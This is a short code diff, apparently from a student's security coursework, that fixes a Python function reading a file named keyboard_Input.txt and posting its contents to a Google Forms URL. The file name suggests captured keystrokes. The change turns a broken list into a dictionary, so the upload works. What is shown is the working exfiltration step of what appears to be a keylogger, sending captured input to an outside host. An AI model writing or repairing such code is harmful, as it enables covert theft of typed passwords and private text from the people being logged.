@@ -14,7 +14,7 @@ def send_request():
     form_input = open("/home/student/Documents/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
     form_send = form_input.read()
     url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd63z5rAVie4clZ-PttFpHwCUJuhBeU6cCIbgsPGiZqbOz19g/formResponse'
-    form_data = ['entry.839337160' : f"'{form_send}'"]
+    form_data = {'entry.839337160' : f"'{form_send}'"}
     r = requests.post(url, data=form_data)
 
 def interval():
